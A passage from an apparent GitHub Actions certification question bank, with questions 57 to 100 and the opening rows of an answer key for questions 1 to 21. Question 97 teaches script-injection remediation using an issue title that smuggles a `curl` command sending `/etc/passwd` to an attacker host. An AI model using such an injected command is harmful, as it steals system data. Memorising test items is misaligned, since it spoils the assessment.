- A) GitHub Actions does not compress caches; the 400 MB figure must reflect selective file upload
- B) Cache entries are compressed (zstd or gzip) before storage; the 400 MB represents the compressed archive size
- C) GitHub only stores changed files between cache versions (delta compression)
- D) Node.js `.js` files are automatically minified before caching to reduce size

---

### Question 57 — Workflow Sharing

**Difficulty**: Easy
**Answer Type**: one
**Topic**: Reusable workflow location requirement

**Question**:
Where must a reusable workflow file be located for it to be callable from other repositories?

- A) In a dedicated `shared-workflows` branch of the repository
- B) In the `.github/workflows/` directory of a repository, triggered with `on: workflow_call:`
- C) In `.github/actions/` — the standard location for shared automation
- D) In the organization's `.github` repository under `/workflows/`

---

### Question 58 — Workflow Sharing

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Reusable workflow — caller limitations

**Scenario**:
A developer tries to nest reusable workflows by having reusable workflow A call reusable workflow B, which calls reusable workflow C.

**Question**:
What is the nesting limit for reusable workflows in GitHub Actions?

- A) Reusable workflows cannot call other reusable workflows — only non-reusable workflows can call reusable ones
- B) Up to 4 levels of nesting are supported (caller → A → B → C is valid at level 3)
- C) Unlimited nesting is supported
- D) Exactly 1 level — a reusable workflow can call one other reusable workflow but not a third

---

### Question 59 — Workflow Sharing

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Cross-repository reusable workflow access

**Scenario**:
Repository `org/app-repo` wants to call a reusable workflow stored in private repository `org/shared-workflows`. The shared-workflows repository has default access settings.

**Question**:
What must be configured to allow `org/app-repo` to access the reusable workflow in `org/shared-workflows`?

- A) Nothing — all repositories within the same organization can call reusable workflows from any private repository by default
- B) The `org/shared-workflows` repository must be set to `internal` visibility or explicitly configured under Settings → Actions → Access → allow workflows from other repositories in the organization
- C) A personal access token with `repo` scope must be created and stored as a secret in `org/app-repo`
- D) The reusable workflow must be published to the GitHub Actions Marketplace before it can be used cross-repository

---

### Question 60 — Workflow Sharing

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Passing outputs from reusable workflow to caller

**Scenario**:
A reusable `build` workflow generates a `version` output in one of its jobs. The calling workflow needs to use this output in a subsequent job.

**Question**:
How must the reusable workflow declare this output at the `workflow_call` level so the caller can access it?

- A) Job-level outputs are automatically surfaced to callers — no additional declaration needed
- B) The reusable workflow must declare `outputs: version: value: ${{ jobs.<job-id>.outputs.version }}` under `on: workflow_call:` to expose the job output to callers
- C) Use `secrets:` block under `workflow_call:` to pass sensitive outputs like version strings
- D) The reusable workflow cannot expose outputs; use a shared artifact instead

---

### Question 61 — Workflow Sharing

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Required workflows — PR check enforcement

**Scenario**:
An enterprise required workflow runs on all repositories. A developer opens a PR in a repository and checks the PR status checks section.

**Question**:
How do required workflow results appear in pull requests, and can repository owners bypass them?

- A) Required workflow results appear as optional informational checks and can be bypassed by repository admins
- B) Required workflow results appear in the PR status checks list like any other workflow check; repository owners cannot bypass or disable them as they are enforced at enterprise level
- C) Required workflows run silently without appearing in PR checks — they only appear in the Actions tab
- D) Required workflows appear as blocking checks only if the PR targets the default branch

---

### Question 62 — Workflow Sharing

**Difficulty**: Hard
**Answer Type**: one
**Topic**: Reusable workflow — secrets security boundary

**Scenario**:
Workflow A (caller) calls Reusable Workflow B with `secrets: inherit`. Workflow B calls Reusable Workflow C (nested call) without explicitly passing secrets. Reusable Workflow C attempts to access `secrets.PROD_API_KEY`.

**Question**:
Does Reusable Workflow C have access to `secrets.PROD_API_KEY`, and why?

- A) Yes — `secrets: inherit` from Workflow A propagates through all nested reusable workflow calls automatically
- B) No — `secrets: inherit` passes secrets from caller to the directly called workflow (B) only; Workflow C must also receive secrets explicitly (either by B passing them or using `secrets: inherit` in B's call to C)
- C) Yes — secrets are always available to all workflows running in the same enterprise account
- D) No — nested reusable workflow calls never have access to secrets regardless of inherit configuration

---

### Question 63 — Workflow Debugging

**Difficulty**: Easy
**Answer Type**: one
**Topic**: Re-running failed jobs with debug logging

**Question**:
A workflow run fails, and the developer wants to re-run only the failed jobs with debug logging enabled to gather more information. Which GitHub UI option provides this?

- A) Click "Re-run all jobs" — debug logging applies automatically to re-runs
- B) Click "Re-run failed jobs" then check "Enable debug logging" on the re-run dialog
- C) Set `ACTIONS_STEP_DEBUG` secret to `true`, then click "Re-run failed jobs"
- D) Edit the workflow file to add `debug: true` to the failing job, commit, and let CI re-run

---

### Question 64 — Workflow Debugging

**Difficulty**: Medium
**Answer Type**: one
**Topic**: ::group:: and ::endgroup:: commands

**Scenario**:
A build step runs a long compilation and produces hundreds of log lines. The team wants to fold these into a collapsible group in the GitHub Actions log viewer, titled "Compilation Output".

**Question**:
Which workflow commands create a collapsible log group?

- A) `echo "---BEGIN Compilation Output---"` and `echo "---END---"` — GitHub detects these markers automatically
- B) `echo "::group::Compilation Output"` before the output and `echo "::endgroup::"` after
- C) `echo "::fold::Compilation Output"` and `echo "::endfold::"`
- D) `echo "::collapse::Compilation Output"` before and `echo "::expand::"` after

---

### Question 65 — Workflow Debugging

**Difficulty**: Medium
**Answer Type**: one
**Topic**: ::notice:: workflow command

**Scenario**:
A deployment step successfully completes and the developer wants to surface a green informational annotation in the GitHub UI (not a warning or error) showing the deployed URL.

**Question**:
Which workflow command creates an informational notice annotation?

- A) `echo "::info::Deployed to https://app.example.com"`
- B) `echo "::notice::Deployed to https://app.example.com"`
- C) `echo "::success::Deployed to https://app.example.com"`
- D) `echo "::log level=notice::Deployed to https://app.example.com"`

---

### Question 66 — Workflow Debugging

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Dumping GitHub context for debugging

**Scenario**:
A developer is troubleshooting why a workflow condition is not evaluating as expected. They want to print the entire `github` context object to the logs to inspect all available values.

**Question**:
Which `run:` command correctly dumps the full `github` context as readable JSON?

- A) `echo $GITHUB_CONTEXT`
- B) `echo '${{ toJSON(github) }}'`
- C) `env: GITHUB_CONTEXT: ${{ toJSON(github) }}` at the step level, then `echo "$GITHUB_CONTEXT"`
- D) Both B and C work — B uses direct expression interpolation; C maps to env first (recommended for multi-line JSON)

---

### Question 67 — Workflow Debugging

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Step outcome vs conclusion

**Scenario**:
A step uses `continue-on-error: true`. The step fails (exits with non-zero). A subsequent step checks `steps.<id>.outcome` and `steps.<id>.conclusion`.

**Question**:
What are the values of `outcome` and `conclusion` for the failed step with `continue-on-error: true`?

- A) Both `outcome` and `conclusion` equal `failure`
- B) `outcome` equals `failure` (actual result); `conclusion` equals `success` (because `continue-on-error: true` masks the failure)
- C) `outcome` equals `success` (masked); `conclusion` equals `failure` (actual result)
- D) Both equal `skipped` because the step was configured to continue on error

---

### Question 68 — Workflows REST API

**Difficulty**: Easy
**Answer Type**: one
**Topic**: Listing workflow files

**Question**:
Which REST API endpoint returns a list of all workflow files defined in a repository along with their IDs, names, and states?

- A) `GET /repos/{owner}/{repo}/actions/runs`
- B) `GET /repos/{owner}/{repo}/actions/workflows`
- C) `GET /repos/{owner}/{repo}/contents/.github/workflows`
- D) `GET /repos/{owner}/{repo}/actions/jobs`

---

### Question 69 — Workflows REST API

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Getting a specific workflow run

**Scenario**:
A monitoring script has saved the `run_id` from a previous API response and needs to poll the run's completion status, conclusion, and timing information.

**Question**:
Which API endpoint retrieves details for a specific workflow run by its ID?

- A) `GET /repos/{owner}/{repo}/actions/workflows/{workflow_id}/runs/{run_id}`
- B) `GET /repos/{owner}/{repo}/actions/runs/{run_id}`
- C) `GET /repos/{owner}/{repo}/actions/jobs/{run_id}`
- D) `GET /repos/{owner}/{repo}/actions/runs?run_id={run_id}`

---

### Question 70 — Workflows REST API

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Downloading workflow run logs

**Scenario**:
A compliance team needs to archive all workflow logs for a specific run as a zip file for long-term storage.

**Question**:
Which API endpoint downloads the log archive for a specific workflow run?

- A) `GET /repos/{owner}/{repo}/actions/runs/{run_id}/artifacts`
- B) `GET /repos/{owner}/{repo}/actions/runs/{run_id}/logs`
- C) `POST /repos/{owner}/{repo}/actions/runs/{run_id}/export`
- D) `GET /repos/{owner}/{repo}/actions/jobs/{job_id}/logs`

---

### Question 71 — Workflows REST API

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Listing jobs for a workflow run

**Scenario**:
A dashboard application displays individual job statuses (not just the overall workflow run status) for each run. It needs job names, runner information, step statuses, and timing.

**Question**:
Which API endpoint returns this job-level detail for a specific workflow run?

- A) `GET /repos/{owner}/{repo}/actions/runs/{run_id}/jobs`
- B) `GET /repos/{owner}/{repo}/actions/workflows/{workflow_id}/jobs`
- C) `GET /repos/{owner}/{repo}/actions/jobs?run_id={run_id}`
- D) `GET /repos/{owner}/{repo}/actions/runs/{run_id}/steps`

---

### Question 72 — Workflows REST API

**Difficulty**: Medium
**Answer Type**: one
**Topic**: workflow_dispatch via API — required inputs

**Scenario**:
A workflow defines a `workflow_dispatch` trigger with a required input `version` (no default). An automation script calls the dispatch API endpoint without providing the `inputs` field.

**Question**:
What does the GitHub API return when a required dispatch input is omitted?

- A) The workflow runs with an empty string for the missing input
- B) The API returns a `422 Unprocessable Entity` error indicating the required input is missing
- C) The API returns `200 OK` but the workflow run is queued in a failed state
- D) The API uses the last successfully run value for the missing input

---

### Question 73 — Reviewing Deployments

**Difficulty**: Easy
**Answer Type**: one
**Topic**: Deployment review timeout

**Question**:
If designated reviewers do not respond to a pending deployment approval request, how long does GitHub wait before automatically timing out the deployment?

- A) 24 hours
- B) 30 days
- C) The deployment waits indefinitely until explicitly approved or rejected — there is no automatic timeout
- D) 72 hours for free plans; 30 days for paid plans

---

### Question 74 — Reviewing Deployments

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Rejected deployment workflow behavior

**Scenario**:
A reviewer rejects a pending production deployment. The workflow has three more steps defined after the environment gate.

**Question**:
What happens to the workflow run after the reviewer rejects the deployment?

- A) The workflow job fails with status `rejected`, and the remaining steps in the job are skipped
- B) The remaining steps execute but with read-only `GITHUB_TOKEN` permissions
- C) The job is retried up to 3 times before marking as failed
- D) The workflow pauses for 1 hour to allow the requester to appeal the rejection

---

### Question 75 — Reviewing Deployments

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Multiple environments in sequence

**Scenario**:
A workflow deploys to `staging` first, then to `production`. Both environments have Required Reviewers configured. After staging is approved and successfully deployed, the workflow reaches the production gate.

**Question**:
Does the production deployment require a separate approval even though staging was already approved?

- A) No — approving staging approval flows through to production automatically in sequential deployments
- B) Yes — each environment gate requires its own independent approval; staging approval does not satisfy the production approval requirement
- C) Only if the production environment has different reviewers than staging
- D) No — the second approval is only required if more than 48 hours have passed since the first approval

---

### Question 76 — Reviewing Deployments

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Deployment environment history tracking

**Scenario**:
An operations team wants to see a timeline of all production deployments for the past month, including which commits were deployed, who approved them, and whether they succeeded or failed.

**Question**:
Where is this information available in the GitHub UI?

- A) Repository → Insights → Deployments — shows a timeline of deployment events
- B) Repository → Deployments page (accessible via the Environments section on the repository home page) — shows per-environment deployment history
- C) Repository → Actions → Filter by workflow name — shows all workflow runs but not environment-specific deployment history
- D) Repository → Security → Audit log — all deployment records are stored here exclusively

---

### Question 77 — Reviewing Deployments

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Bypassing environment protection rules (admin override)

**Scenario**:
A critical hotfix must be deployed to production immediately. The two required reviewers are both unavailable. The repository admin needs to bypass the approval gate for this emergency deployment.

**Question**:
What is the correct way for an admin to handle this situation in GitHub?

- A) The admin can delete the environment temporarily, run the workflow, then recreate the environment
- B) GitHub does not provide an admin bypass for Required Reviewers — the organization must ensure adequate reviewer coverage for emergency scenarios; the admin can remove themselves from the required reviewers list and approve, or another team member can be added as an emergency reviewer
- C) The admin can use the GitHub API with a special `force: true` parameter to bypass environment gates
- D) The admin can directly edit the workflow YAML to remove the `environment:` key, push the change, and the deployment will run without the gate

---

### Question 78 — Creating and Publishing Actions

**Difficulty**: Easy
**Answer Type**: one
**Topic**: Composite action structure

**Question**:
In a composite action's `action.yml`, which `runs:` configuration is used to define the action as a composite type?

- A) `runs: using: composite steps: [...]`
- B) `runs: using: bash steps: [...]`
- C) `runs: using: script steps: [...]`
- D) `runs: type: composite actions: [...]`

---

### Question 79 — Creating and Publishing Actions

**Difficulty**: Medium
**Answer Type**: one
**Topic**: JavaScript action — pre and post scripts

**Scenario**:
A JavaScript action needs to perform cleanup (delete temporary files) after the main action logic runs, regardless of whether the main step succeeded. The developer wants this to happen automatically.

**Question**:
Which `action.yml` `runs:` configuration enables a post-execution cleanup script?

- A) `runs: using: node20 main: index.js cleanup: cleanup.js`
- B) `runs: using: node20 main: index.js post: cleanup.js`
- C) `runs: using: node20 main: index.js after: cleanup.js always: true`
- D) Add a separate step with `if: always()` in the calling workflow to run cleanup

---

### Question 80 — Creating and Publishing Actions

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Publishing to GitHub Marketplace

**Scenario**:
A developer has created a useful GitHub Action and wants to publish it to the GitHub Marketplace so the community can discover and use it.

**Question**:
What are the requirements for publishing an action to the GitHub Marketplace?

- A) The action repository must be public, have an `action.yml` in the root, and the developer must click "Publish this Action to the GitHub Marketplace" in the repository's Releases section
- B) The action must be submitted as a pull request to the `actions/marketplace` repository for GitHub review
- C) The action must have at least 10 stars and pass an automated security scan before it can be listed
- D) Only GitHub-verified organizations can publish actions to the Marketplace; individual developers must use GitHub Packages instead

---

### Question 81 — Creating and Publishing Actions

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Docker action image sourcing options

**Scenario**:
A developer creates a Docker action. The Docker image takes 3 minutes to build on every run. They want to reduce this overhead by pre-building and publishing the image.

**Question**:
Which `action.yml` `runs:` configuration uses a pre-built image from Docker Hub instead of building from a Dockerfile?

- A) `runs: using: docker image: docker://myorg/my-action:latest`
- B) `runs: using: docker image: myorg/my-action:latest`
- C) `runs: using: container image: docker.io/myorg/my-action:latest`
- D) `runs: using: docker registry: docker.io image: myorg/my-action tag: latest`

---

### Question 82 — Creating and Publishing Actions

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Action input — required vs optional

**Scenario**:
A custom action has an input `timeout-seconds` that most callers won't need to override. The default should be `30`. If a caller doesn't provide the input, the action should use 30 seconds.

**Question**:
Which `action.yml` input definition is correct?

- A) `inputs: timeout-seconds: description: "Timeout" required: true default: "30"`
- B) `inputs: timeout-seconds: description: "Timeout" required: false default: "30"`
- C) `inputs: timeout-seconds: description: "Timeout" optional: true value: "30"`
- D) `inputs: timeout-seconds: description: "Timeout" default: "30"` (required field omitted — defaults to optional)

---

### Question 83 — Creating and Publishing Actions

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Security — action supply chain with SHA pinning

**Scenario**:
A security scan identifies that a workflow uses `uses: corp/deploy-action@v2`. The security team flags this as a potential supply chain risk.

**Question**:
Why is a tag reference like `@v2` considered a security risk, and what mitigation does GitHub recommend?

- A) Tags in GitHub Actions are deprecated; all actions should use the `main` branch reference
- B) Version tags can be deleted and recreated pointing to different (potentially malicious) commits; pinning to a full commit SHA (`@<SHA>`) guarantees the exact code that was reviewed is always used
- C) The `v2` tag indicates a pre-release version; only stable `v2.0.0` semver tags are security-safe
- D) Using tags from non-GitHub-verified publishers is the risk; switching to a verified publisher's tag resolves it

---

### Question 84 — Managing Runners

**Difficulty**: Easy
**Answer Type**: one
**Topic**: Hosted runner specifications

**Question**:
What are the standard CPU and RAM specifications for a GitHub-hosted `ubuntu-latest` runner?

- A) 4 CPUs, 16 GB RAM
- B) 2 CPUs, 7 GB RAM
- C) 8 CPUs, 32 GB RAM
- D) 1 CPU, 3.75 GB RAM

---

### Question 85 — Managing Runners

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Self-hosted runner — ephemeral mode

**Scenario**:
An organization wants to ensure that each workflow job gets a fresh, clean runner environment with no leftover files or state from previous jobs. They are using self-hosted runners on Kubernetes.

**Question**:
Which self-hosted runner configuration option enables a fresh runner instance per job?

- A) `--clean` flag when starting the runner agent
- B) `--ephemeral` flag during runner configuration (`./config.sh --ephemeral`) — the runner accepts one job then deregisters
- C) `--once` mode — the runner polls for exactly one job then stops
- D) Both B and C achieve this; `--ephemeral` is the newer recommended approach

---

### Question 86 — Managing Runners

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Actions Runner Controller (ARC)

**Scenario**:
An organization wants to run self-hosted GitHub Actions runners on their Kubernetes cluster that automatically scale up when jobs are queued and scale down to zero when idle, minimizing infrastructure costs.

**Question**:
Which project/tool provides Kubernetes-native auto-scaling for GitHub Actions self-hosted runners?

- A) GitHub Actions Autoscaler (GAS) — an official GitHub CLI plugin
- B) Actions Runner Controller (ARC) — a Kubernetes operator that manages self-hosted runner lifecycles and auto-scaling
- C) Karpenter with GitHub webhook integration — cloud-native node scaling triggered by Actions events
- D) GitHub Enterprise Server's built-in runner orchestration feature

---

### Question 87 — Managing Runners

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Runner tool cache

**Scenario**:
A developer notices that GitHub-hosted runners already have common tools like Node.js, Python, and Java pre-installed without any setup steps in the workflow.

**Question**:
Where on a GitHub-hosted runner are pre-installed tools (SDKs, runtimes) stored, and which environment variable points to this location?

- A) `/usr/local/bin/` — standard system path; no special environment variable
- B) The tool cache directory referenced by `RUNNER_TOOL_CACHE` — `actions/setup-*` actions install into this location and add the appropriate version to `PATH`
- C) `$GITHUB_WORKSPACE/tools/` — tools are workspace-scoped per run
- D) `/opt/hostedtoolcache/` — hard-coded path with no environment variable reference

---

### Question 88 — Managing Runners

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Runner group policies — enterprise vs org

**Scenario**:
An enterprise administrator creates a runner group at the enterprise level and assigns it to specific organizations. An organization administrator tries to add repositories from other organizations to this group.

**Question**:
What access control constraint applies to enterprise-level runner groups?

- A) Enterprise-level runner groups can be accessed by all organizations and repositories in the enterprise — no restrictions
- B) Enterprise-level runner groups are managed by the enterprise admin; organization admins can only manage access for their own organization's repositories within the enterprise-allowed scope — they cannot add repositories from other organizations
- C) Organization administrators have full control over enterprise-level runner groups once assigned to their organization
- D) Enterprise-level runner groups can only be used by required workflows, not by regular repository workflows

---

### Question 89 — GitHub Actions Enterprise

**Difficulty**: Easy
**Answer Type**: one
**Topic**: Disabling Actions for specific repositories

**Scenario**:
An enterprise administrator wants to disable GitHub Actions for a specific high-sensitivity repository while keeping it enabled for all other repositories in the organization.

**Question**:
At which level can GitHub Actions be disabled for a specific repository?

- A) Only at the enterprise level — repository-level Actions cannot be independently disabled
- B) At the repository level under Settings → Actions → General → Actions permissions → Disable Actions
- C) At the organization level with a filter pattern matching the specific repository name
- D) By removing all `.github/workflows/` files — GitHub disables Actions automatically when no workflow files exist

---

### Question 90 — GitHub Actions Enterprise

**Difficulty**: Medium
**Answer Type**: one
**Topic**: GHES — GitHub Actions on-premises requirements

**Scenario**:
An organization runs GitHub Enterprise Server (GHES) on-premises and wants to enable GitHub Actions. Their security policy prohibits runners from making outbound internet connections.

**Question**:
What infrastructure consideration is critical for running GitHub Actions with self-hosted runners on GHES in an air-gapped environment?

- A) GitHub Actions cannot run on GHES without internet connectivity — cloud-hosted runners are required
- B) Self-hosted runners must be configured to communicate with the GHES instance (not github.com); actions from the Marketplace must be manually mirrored or only locally-stored actions can be used
- C) GHES automatically creates an offline action cache that mirrors all GitHub Marketplace actions
- D) Air-gapped GHES requires purchasing GitHub Advanced Security to enable Actions

---

### Question 91 — GitHub Actions Enterprise

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Audit log for Actions events

**Scenario**:
A security incident response team needs to investigate which user triggered a specific deployment workflow run and from which IP address, 10 days ago.

**Question**:
Where should the team look for this information?

- A) Repository → Actions → filter by workflow name and date — IP addresses are shown in run details
- B) Organization or Enterprise → Settings → Audit log — records workflow trigger events including actor, IP address, and timestamps
- C) Repository → Insights → Actions usage — provides actor information for all workflow runs
- D) GitHub Support must be contacted for IP address information — it is not exposed in any UI

---

### Question 92 — GitHub Actions Enterprise

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Secrets at enterprise level

**Scenario**:
An enterprise has 50 organizations, each with dozens of repositories. A common deployment token needs to be available to all workflows across the entire enterprise without manually adding it to each organization or repository.

**Question**:
Which secret scope allows a secret to be available across all organizations and repositories in an enterprise?

- A) Repository secrets — added once to a central "secrets" repository and shared via reusable workflows
- B) Enterprise secrets — configured at the enterprise level and available to all organizations within the enterprise
- C) Organization secrets with access policy set to "all repositories" — must be repeated in each organization
- D) GitHub does not support enterprise-level secrets; organization-level secrets are the broadest scope

---

### Question 93 — GitHub Actions Enterprise

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Policy — first-time contributor approval at enterprise

**Scenario**:
A large open-source enterprise wants to standardize the policy requiring new GitHub users (accounts less than a week old) contributing to any public repository to have their workflows approved before running. This policy must apply uniformly across all 30 organizations in the enterprise.

**Question**:
How is this policy enforced uniformly across all organizations?

- A) Each organization admin must individually configure "Require approval for first-time contributors who are new to GitHub" in their organization settings
- B) The enterprise administrator sets the fork PR workflow approval policy in Enterprise Settings → Policies → Actions, which overrides and standardizes the policy for all organizations
- C) A required workflow at enterprise level performs the new-user check before any other workflow runs
- D) GitHub Enterprise contract terms automatically apply this policy to all enterprise accounts

---

### Question 94 — Security and Optimization

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Minimal permissions block structure

**Scenario**:
A workflow job only needs to read repository contents and write comments to issues. The developer wants to explicitly grant only these two permissions.

**Question**:
Which `permissions:` block correctly implements least-privilege for this job?

- A) `permissions: read-all` then explicitly deny everything except `issues: write`
- B) `permissions: contents: read issues: write`
- C) `permissions: repo: read issues: write`
- D) `permissions: contents: read pull-requests: write` — issue comments require pull-requests scope

---

### Question 95 — Security and Optimization

**Difficulty**: Medium
**Answer Type**: one
**Topic**: OIDC — id-token: write permission requirement

**Scenario**:
A developer configures an AWS OIDC integration but the workflow fails with `Error: Credentials could not be loaded`. The `aws-actions/configure-aws-credentials` action is used correctly. The workflow-level `permissions: read-all` is set.

**Question**:
What is the most likely cause of the credentials failure related to permissions?

- A) `read-all` must be changed to `write-all` to allow OIDC token creation
- B) The job needs `permissions: id-token: write` in addition to (or instead of) the workflow-level permission — OIDC token requests require the `id-token: write` scope specifically on the requesting job
- C) OIDC requires `permissions: packages: write` to authenticate with AWS container registries
- D) `read-all` at the workflow level already includes `id-token: write` — the issue is a missing AWS IAM role configuration

---

### Question 96 — Security and Optimization

**Difficulty**: Hard
**Answer Type**: one
**Topic**: Pinned SHA for security — verification process

**Scenario**:
An organization's security policy requires all third-party actions to be pinned to full commit SHAs. A developer asks: "How do I know the SHA I'm pinning to is actually the version I intended (e.g., `v3.1.0`) and hasn't been tampered with?"

**Question**:
What is the correct process to securely verify that a commit SHA corresponds to the intended action version before pinning?

- A) Trust the action's README — developers always document the correct SHA for each version
- B) On the action's GitHub repository, navigate to the Releases page, find `v3.1.0`, click the tag, and record the full commit SHA shown — or use `git ls-remote https://github.com/actions/action-name refs/tags/v3.1.0` to resolve the tag to a SHA before pinning
- C) Use the GitHub API `GET /repos/{owner}/{repo}/git/ref/tags/v3.1.0` to retrieve the tag SHA, then use `GET /repos/{owner}/{repo}/git/tags/{sha}` to dereference the annotated tag object to the commit SHA
- D) Both B and C are valid verification methods — B uses the web UI; C uses the API for scripted/automated verification

---

### Question 97 — Security and Optimization

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Expression injection via issue title

**Scenario**:
A workflow step is:
```yaml
- name: Create branch
  run: git checkout -b issue-${{ github.event.issue.number }}-${{ github.event.issue.title }}
```
A security researcher opens an issue titled `foo; curl https://attacker.com/$(cat /etc/passwd) #`.

**Question**:
What vulnerability does this workflow contain, and what is the remediation?

- A) No vulnerability — issue numbers are safe integers; issue titles are URL-encoded before injection
- B) Script injection via untrusted `github.event.issue.title` — the title is attacker-controlled and injected directly into a shell command. Remediate by assigning to an environment variable (`ISSUE_TITLE: ${{ github.event.issue.title }}`) and using `$ISSUE_TITLE` in the shell command
- C) The vulnerability only exists if the issue creator has write access; read-only contributors cannot inject commands
- D) Remediate by switching from `run:` to `uses:` with a sanitization action that strips special characters

---

### Question 98 — Common Failures & Troubleshooting

**Difficulty**: Easy
**Answer Type**: one
**Topic**: Runner not found error

**Question**:
A workflow fails immediately with `Error: No runner matching the specified labels was found`. What is the most likely cause?

- A) The workflow YAML has a syntax error in the `runs-on:` key
- B) No online self-hosted runner has all the labels specified in `runs-on:` — the runner may be offline, unregistered, or missing the required label
- C) GitHub-hosted runners are temporarily unavailable due to a service outage
- D) The `runs-on:` value uses a deprecated runner image name that has been removed

---

### Question 99 — Common Failures & Troubleshooting

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Cache not restoring — key mismatch debugging

**Scenario**:
A developer expects a cache hit on every run but consistently gets cache misses. The cache key is `${{ runner.os }}-pip-${{ hashFiles('**/requirements.txt') }}`. After investigation, they discover the hash changes every run.

**Question**:
What is the most likely cause of the hash changing on every run?

- A) `hashFiles` generates a random salt on each invocation to prevent cache poisoning
- B) A `requirements.txt` file is being regenerated or modified as part of the workflow before the cache step runs — check if an earlier step modifies `requirements.txt`
- C) `runner.os` changes between runs because GitHub rotates runner OS versions automatically
- D) The `**/` glob pattern matches too many files, causing hash instability — use a direct path instead

---

### Question 100 — Common Failures & Troubleshooting

**Difficulty**: Hard
**Answer Type**: one
**Topic**: Concurrency group deadlock

**Scenario**:
A workflow has this concurrency configuration:
```yaml
concurrency:
  group: deploy-${{ github.ref }}
  cancel-in-progress: false
```
The team notices that on a busy `main` branch, deployments are queuing up and some PRs show their deployment workflows "stuck" waiting indefinitely while the queue grows.

**Question**:
What is causing the queue buildup, and what configuration change would prevent indefinite backlog growth while preserving deployment ordering?

- A) `cancel-in-progress: false` is incorrect syntax; use `cancel-in-progress: preserve` instead
- B) `cancel-in-progress: false` means queued runs wait for the running run to complete rather than being cancelled. With high commit frequency, the queue grows faster than deployments complete. Changing to `cancel-in-progress: true` cancels the currently waiting run when a newer one is queued, ensuring only the latest commit deploys while older intermediate commits are discarded
- C) The `group` expression should use `github.run_id` instead of `github.ref` to create unique groups per run
- D) The issue is that `github.ref` includes `refs/heads/main` which contains slashes — illegal in concurrency group names; URL-encode the ref value

---

## Answer Key

| Q# | Answer(s) | Explanation | Source | Difficulty |
|----|-----------|-------------|--------|------------|
| 1 | B | The extension uses GitHub's official Actions workflow JSON schema, kept up to date, to validate YAML files in real time. | 01-GitHub-Actions-VS-Code-Extension.md | Easy |
| 2 | B | Hovering over an action `uses:` reference displays metadata from the remote `action.yml` including inputs and outputs, without leaving the editor. | 01-GitHub-Actions-VS-Code-Extension.md | Medium |
| 3 | B | The extension's IntelliSense integration with the GitHub Actions schema provides property completions and known value suggestions for context expressions. | 01-GitHub-Actions-VS-Code-Extension.md | Medium |
| 4 | B | The extension validates the open editor buffer continuously in real time — no save action is required to see syntax errors highlighted inline. | 01-GitHub-Actions-VS-Code-Extension.md | Medium |
| 5 | B | The GitHub Actions extension requires the YAML extension by Red Hat to be installed for its schema validation and language features to work correctly. | 01-GitHub-Actions-VS-Code-Extension.md | Easy |
| 6 | C | `github.event_name` contains the name of the event that triggered the workflow (e.g., `push`, `pull_request`, `workflow_dispatch`). | 02-Contextual-Information.md | Easy |
| 7 | B | `GITHUB_REF` contains the full ref path like `refs/heads/main`; comparing it to `main` always fails. Use `GITHUB_REF_NAME` for the short name or compare to `refs/heads/main`. | 02-Contextual-Information.md | Medium |
| 8 | B | `${{ github.sha }}` provides the full 40-character commit SHA of the triggering commit — ideal for immutable Docker image tags. | 02-Contextual-Information.md | Medium |
| 9 | C | `${{ job.status }}` reflects the current job's status (`success`, `failure`, or `cancelled`) and is accessible in steps within the same job. | 02-Contextual-Information.md | Medium |
| 10 | B | The `vars` context (`${{ vars.VAR_NAME }}`) provides access to repository and organization non-secret configuration variables set in Settings → Variables. | 02-Contextual-Information.md | Medium |
| 11 | A | The `job` context is not available at the workflow-level `env:` key — only `github`, `inputs`, and `vars` are available there. | 03-Context-Availability-Reference.md | Easy |
| 12 | C | The `steps` context IS available in `steps[*].if:` conditions; the expression must be wrapped in `${{ }}` when used in an `if:` condition. | 03-Context-Availability-Reference.md | Medium |
| 13 | B | Downstream jobs access upstream job outputs through the `needs` context: `${{ needs.<job-id>.outputs.<output-name> }}`. | 03-Context-Availability-Reference.md | Medium |
| 14 | B | `${{ matrix.node-version }}` accesses the current matrix dimension value inside any step of a matrix job. | 03-Context-Availability-Reference.md | Medium |
| 15 | B | `${{ inputs.<name> }}` accesses `workflow_call` inputs inside a reusable workflow, the same syntax used for `workflow_dispatch` inputs. | 03-Context-Availability-Reference.md | Medium |
| 16 | C | `on:` is the only mandatory top-level key — every workflow must define at least one trigger event. `name:`, `env:`, and `defaults:` are all optional. | 04-Workflow-File-Structure.md | Easy |
| 17 | C | Using map syntax `on: push: branches: [main] pull_request:` under a single `on:` key is the correct way to combine triggers with different filters. | 04-Workflow-File-Structure.md | Medium |
| 18 | B | `needs: [lint, test]` array syntax declares that `deploy` depends on both `lint` and `test` completing successfully before it starts. | 04-Workflow-File-Structure.md | Medium |
| 19 | B | `continue-on-error: true` at the job level means the workflow reports success even if this job fails, preventing it from blocking other required jobs. | 04-Workflow-File-Structure.md | Medium |
| 20 | B | `environment: name: staging url: https://staging.example.com` sets the deployment environment and provides the URL for the Deployments section. | 04-Workflow-File-Structure.md | Medium |
| 21 | D | Both B and C produce exactly three combinations. Option B uses explicit `include` entries; Option C uses the full 2×2 matrix with an `exclude` to remove the macOS+Node 18 combination. | 04-Workflow-File-Structure.md | Medium |
